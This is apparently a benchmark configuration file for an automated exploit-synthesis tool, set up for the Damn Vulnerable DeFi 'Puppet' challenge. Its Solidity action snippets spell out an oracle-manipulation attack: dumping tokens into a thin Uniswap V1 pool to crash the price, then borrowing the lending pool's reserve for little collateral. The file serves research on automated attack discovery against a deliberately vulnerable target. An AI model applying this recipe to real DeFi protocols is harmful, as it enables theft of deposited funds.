# Damn Vulnerable DeFi — Puppet (V1). Scenario is deployed locally in setUp(), so the
# fork block is arbitrary (any archive block the RPC serves). Declarative benchmark:
# the flashsyn CLI builds the action model from this file; the Solidity harness (with
# setUp / interfaces) lives next to it in attack.t.sol.

name = "puppet"
contract = "Puppet"      # --match-contract name in attack.t.sol
chain = "ETH"
block = 16818064
max_synthesis_len = 3


# Profit = (final - initial) * price over these, in profit readout order (see manifest._profit_readout).
profit_tokens = ["DVT", "ETH"]

# Attacker starts with 1000 DVT and 25 ETH — must match setUp() in attack.t.sol.
[initial_balances]
DVT = 1000
ETH = 25

# ETH weighed 1000, DVT 1 (same relative scale as the DVD challenge).
[token_prices]
ETH = 1000.0
DVT = 1.0

# token -> [contract variable in the harness, decimals]. A third element "native" means
# the token has no ERC20 balanceOf, so the derived collector reads address(attacker).balance.
[token_info]
DVT = ["dvt", 18]
ETH = ["", 18, "native"]

# Dump DVT into the tiny Uniswap V1 exchange — this is what crashes the oracle. Output is
# native ETH; the derived collector measures address(attacker).balance (the native flag).
[[actions]]
name = "SwapUniswapDVT2ETH"
tokens_in = ["DVT"]
tokens_out = ["ETH"]
range = [0, 1000]                          # can't sell more DVT than the attacker holds
solidity = "uniswapExchange.tokenToEthSwapInput($$ * 1e18, 1, 0xffffffff);"

# Buy DVT back with ETH (the reverse leg). Output is the DVT ERC20, so the derived collector
# (DVT gain via balanceOf) and the default transit (ETH -= input, DVT += collected) both apply.
[[actions]]
name = "SwapUniswapETH2DVT"
tokens_in = ["ETH"]
tokens_out = ["DVT"]
range = [0, 25]
solidity = "uniswapExchange.ethToTokenSwapInput{value: $$ * 1e18}(1, 0xffffffff);"

# Borrow DVT from the pool. Inverts the default model: the search parameter is the DVT
# RECEIVED, while the ETH collateral is a function of the manipulated oracle. That collateral
# is the internal value _dep — not a start-to-end balance delta — so the action records it
# inline with collect.spent (Mode B); the engine just appends collect.flush().
[[actions]]
name = "PoolBorrow"
tokens_in = ["ETH"]                        # collateral paid (collected), not the search param
tokens_out = ["DVT"]                       # borrowed amount == the search param
range = [0, 100000]                        # up to the pool's whole 100k DVT reserve
solidity = """
        _amt = $$ * 1e18;
        _dep = puppetPool.calculateDepositRequired(_amt);
        puppetPool.borrow{value: _dep}(_amt);
        collect.spent("ETH", _dep);"""
effects = [
  { token = "DVT", op = "add", src = "input" },      # received == the search parameter
  { token = "ETH", op = "sub", src = "collected" },  # collateral == the recorded _dep
]
